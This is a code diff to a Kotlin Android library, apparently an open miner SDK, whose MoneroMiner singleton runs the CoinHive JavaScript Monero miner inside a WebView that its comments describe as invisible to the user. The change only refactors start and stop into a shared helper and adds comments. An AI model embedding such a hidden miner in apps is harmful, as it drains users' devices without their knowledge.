@@ -29,7 +29,6 @@ import android.webkit.JavascriptInterface
 import android.webkit.WebView
 import android.webkit.WebViewClient
 
-@SuppressLint("StaticFieldLeak")
 /**
  * The MoneroMiner class is a Singleton that embeds a WebView used to interpret the CoinHive Javascript Monero miner.
  * The embedded WebView is invisible to the user and cannot be displayed.
@@ -39,6 +38,7 @@ import android.webkit.WebViewClient
  * @author David Fournier
  * @since 2018.03.01
  */
+@SuppressLint("StaticFieldLeak")
 object MoneroMiner
 {
 
@@ -92,6 +92,12 @@ object MoneroMiner
   @Volatile
   private var hasFinishedLoading = false
 
+  /**
+   * Function called by the integrator (can be stop() or start()).
+   * If the Javascript code hasn't been loaded yet. The function is kept in the @promise parameter
+   * and will be called as soon as the Javascript code is fully loaded.
+   * Doing so, the integrator does not need to be notified when the Javascript code is indeed loaded.
+   */
   private var promise: (() -> Unit)? = null
 
   /**
@@ -133,16 +139,7 @@ object MoneroMiner
    */
   fun start()
   {
-    checkInitialization()
-    promise = null
-    if (hasFinishedLoading)
-    {
-      miner?.loadUrl("javascript:start(\"${id}\", ${throttle}, ${threads});")
-    }
-    else
-    {
-      promise = MoneroMiner::start
-    }
+    execute(javascript = "javascript:start(\"${id}\", ${throttle}, ${threads});", function = MoneroMiner::start)
   }
 
   /**
@@ -151,15 +148,19 @@ object MoneroMiner
    */
   fun stop()
   {
+    execute(javascript = "javascript:stop();", function = MoneroMiner::stop)
+  }
+
+  private fun execute(javascript: String, function: (() -> Unit)?) {
     checkInitialization()
     promise = null
     if (hasFinishedLoading)
     {
-      miner?.loadUrl("javascript:stop();")
+      miner?.loadUrl(javascript)
     }
     else
     {
-      promise = MoneroMiner::stop
+      promise = function
     }
   }
 
@@ -174,6 +175,9 @@ object MoneroMiner
     Log.d(MoneroMiner::class.java.simpleName, text)
   }
 
+  /**
+   * Triggers the id getter that throws an exception if not initialized
+   */
   private fun checkInitialization()
   {
     id = id
